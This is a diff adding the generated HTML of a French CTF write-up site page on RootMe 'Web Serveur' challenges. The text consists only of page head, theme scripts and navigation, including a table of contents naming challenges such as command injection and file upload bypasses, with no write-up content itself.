@@ -1,0 +1,2020 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://redt974.github.io/write-ups/RootMe/Web%20Serveur/Web%20Serveur/">
+      
+      
+        <link rel="prev" href="../../Cryptanalyse/Hash%20-%20DCC2/Hash%20-%20DCC2/">
+      
+      
+        <link rel="next" href="../../../TryHackMe/">
+      
+      
+      <link rel="icon" href="../../../assets/favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.11">
+    
+    
+      
+        <title>Web Serveur - redt974’s write-ups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.4af4bdda.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../stylesheets/pdf.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="dark" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#html-code-source" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="redt974’s write-ups" class="md-header__button md-logo" aria-label="redt974’s write-ups" data-md-component="logo">
+      
+  <img src="../../../assets/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            redt974’s write-ups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Web Serveur
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="dark" data-md-color-accent="deep-purple"  aria-label="Passer en mode sombre"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Passer en mode sombre" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="dark" data-md-color-accent="deep-purple"  aria-label="Passer en mode clair"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Passer en mode clair" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Accueil
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Pentesting/Attaque%20d%27une%20Machine/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Pentesting
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  RootMe
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../TryHackMe/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  TryHackMe
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="redt974’s write-ups" class="md-nav__button md-logo" aria-label="redt974’s write-ups" data-md-component="logo">
+      
+  <img src="../../../assets/logo.png" alt="logo">
+
+    </a>
+    redt974’s write-ups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Accueil
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pentesting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Pentesting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Pentesting/Attaque%20d%27une%20Machine/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Attaque d'une Machine
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Pentesting/Pentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pentesting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    OWASP
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            OWASP
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OWASP Top 10   Cheat Sheet (2017)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OWASP Top 10   Cheat Sheet (2021)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Outils
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Outils
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Pentesting/Outils/Nmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nmap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Pentesting/Outils/SqlMAP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SqlMAP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    RootMe
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            RootMe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../Cryptanalyse/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Cryptanalyse
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Cryptanalyse
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Hash   DCC2
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Hash   DCC2
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cryptanalyse/Hash%20-%20DCC2/Hash%20-%20DCC2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hash   DCC2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web Serveur
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Web Serveur
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Web Serveur
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web Serveur
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#html-code-source" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTML Code Source
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-contournement-de-filtrage-ip" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - Contournement de Filtrage IP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-open-redirect" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - Open Redirect
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-user-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - User Agent
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mot-de-passe-faible" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mot de passe faible
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php-injection-de-commande" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP - Injection de Commande
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fichier-de-sauvegarde" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fichier de sauvegarde
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#directory-indexing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Directory Indexing
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP Headers
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-post" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - POST
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-redirection-invalide" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - Redirection invalide
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-verb-tampering" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP - Verb tampering
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#install-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Install files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload-double-extensions" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Upload - Double extensions
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload-type-mime" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Upload - Type MIME
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../TryHackMe/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    TryHackMe
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            TryHackMe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Boiler CTF
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Boiler CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TryHackMe/Boiler%20CTF/Boiler%20CTF%20-%20TryHackMe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Boiler CTF   TryHackMe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Injection SQL Lab
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Injection SQL Lab
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TryHackMe/Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Injection SQL   TryHackMe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Publisher CTF
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            Publisher CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Publisher CTF   TryHackMe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Rabbit store
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            Rabbit store
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TryHackMe/Rabbit%20store/Rabbit%20store%20-%20TryHackMe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Rabbit store   TryHackMe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
